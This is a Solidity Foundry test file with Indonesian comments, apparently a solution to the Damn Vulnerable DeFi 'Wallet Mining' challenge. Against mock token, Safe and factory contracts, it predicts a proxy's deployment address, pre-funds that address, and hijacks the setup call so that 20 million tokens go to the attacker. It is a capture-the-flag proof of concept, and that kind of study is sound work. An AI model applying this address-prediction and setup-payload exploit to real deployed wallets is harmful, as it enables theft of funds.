// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TOKEN (Langsung bikin di sini biar gak error mint) ---
contract DamnValuableToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Not enough funds");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// --- 2. MOCK INFRASTRUCTURE ---

contract MockGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address paymentReceiver
    ) external {
        // Eksekusi payload saat setup
        if (to != address(0)) {
            (bool success, ) = to.call(data);
            require(success, "Payload Failed");
        }
    }
}

contract MockFactory {
    // Pabrik untuk mencetak dompet
    function createProxy(address singleton, bytes memory data) external returns (address proxy) {
        MockGnosisSafe safe = new MockGnosisSafe();
        proxy = address(safe);
        
        if (data.length > 0) {
            (bool success, ) = proxy.call(data);
            require(success, "Setup Failed");
        }
    }
}

// --- 3. ATTACK SCRIPT ---

contract WalletMiningChallenge is Test {
    DamnValuableToken token;
    MockFactory factory;
    MockGnosisSafe masterCopy;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        
        // Deploy infrastruktur tiruan
        token = new DamnValuableToken();
        factory = new MockFactory();
        masterCopy = new MockGnosisSafe();

        // HITUNG ALAMAT MASA DEPAN (PREDIKSI)
        // Kita hitung alamat yang akan dihasilkan oleh Factory pada nonce 1
        address predictedAddress = computeCreateAddress(address(factory), 1);
        
        console.log("Target Alamat Hantu:", predictedAddress);

        // SETUP: Kirim duit ke alamat hantu itu (sebelum kontraknya ada)
        token.mint(predictedAddress, 20_000_000 ether); // Baris ini harusnya aman sekarang
    }

    function test_WalletMining_Attack() public {
        vm.startPrank(attacker);

        console.log("--- START MINING ---");
        
        // Siapkan Payload: "Transfer 20 Juta ke Attacker"
        bytes memory transferPayload = abi.encodeWithSignature(
            "transfer(address,uint256)", 
            attacker, 
            20_000_000 ether
        );

        // Siapkan Data Setup Gnosis
        address[] memory owners = new address[](1);
        owners[0] = attacker;

        bytes memory setupData = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, 
            1, 
            address(token), // Target: Token
            transferPayload,// Data: Transfer duitnya
            address(0), address(0), 0, address(0)
        );

        // EKSEKUSI
        // Panggil factory untuk deploy. Ini akan mendarat pas di alamat yang kita prediksi.
        address createdProxy = factory.createProxy(address(masterCopy), setupData);
        
        console.log("Dompet Tercipta di:", createdProxy);

        // VALIDASI
        uint256 saldoAttacker = token.balanceOf(attacker);
        console.log("Saldo Attacker:", saldoAttacker);
        
        assertEq(saldoAttacker, 20_000_000 ether, "Misi Gagal: Uang tidak masuk!");
        
        vm.stopPrank();
    }
}
